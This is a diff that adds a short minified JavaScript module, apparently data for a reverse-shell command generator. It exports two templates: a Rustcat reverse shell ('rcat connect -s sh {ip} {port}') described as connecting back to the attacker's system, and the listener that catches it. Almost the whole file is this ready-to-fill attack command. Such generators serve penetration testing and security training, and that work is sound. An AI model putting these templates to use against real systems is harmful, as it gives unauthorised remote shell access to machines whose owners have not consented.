@@ -1,0 +1,1 @@
+const t=[{title:"Rustcat reverse shell",template:"rcat connect -s sh {ip} {port}",description:"Reverse shell using Rustcat to connect back to the attacker's system."},{title:"Rustcat Listener",template:"rcat listen {port}"}],e={commands:t};export{t as commands,e as default};
